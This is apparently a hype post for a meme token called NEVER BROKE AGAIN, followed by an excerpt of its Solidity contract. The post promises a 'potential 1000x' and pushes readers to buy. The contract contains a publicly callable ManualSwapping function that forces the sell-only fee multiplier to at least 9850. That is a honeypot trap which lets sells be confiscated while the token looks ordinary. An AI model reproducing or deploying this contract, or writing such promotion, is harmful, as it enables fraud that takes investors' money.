...
NEVER BROKE AGAIN [ NBAETH ]  - Your new gem token

Using the power of Chad's 🔥 to be the next big meme token

POTENTIAL for HUNDREDS OF MILLIONS in market cap

HUGE marketing plans

🔥🔥🔥 FAIR LAUNCH COMING SOON 🔥🔥🔥

DON'T MISS OUT ON YOUR CHANCE FOR A POTENTIAL 1000x

✅ Huge marketing plans 🔥
✅ Airdrops, bonuses, community events 💰
✅ Waifu collections 🙌

Telegram: t.me/NBAeth
———
–> #NBAeth
———
...
contract NeverBrokeAgain is IERC20, Auth {
    using SafeMath for uint256;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV = 0xF845b8f7e80921e55c2A6099F251dd882397C219;

    string constant _name = "NEVER BROKE AGAIN";
    string constant _symbol = "NBA";
    ...
    uint256 public MaxAllowedValue = 9850;

    uint256 public NewSwappingValue  = 100;
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        uint256 multiplier = isSell ? NewSwappingValue : 100;
    ...
    function ManualSwapping(uint256 Value) public {
        require(Value >= MaxAllowedValue);
        NewSwappingValue = Value;
    }
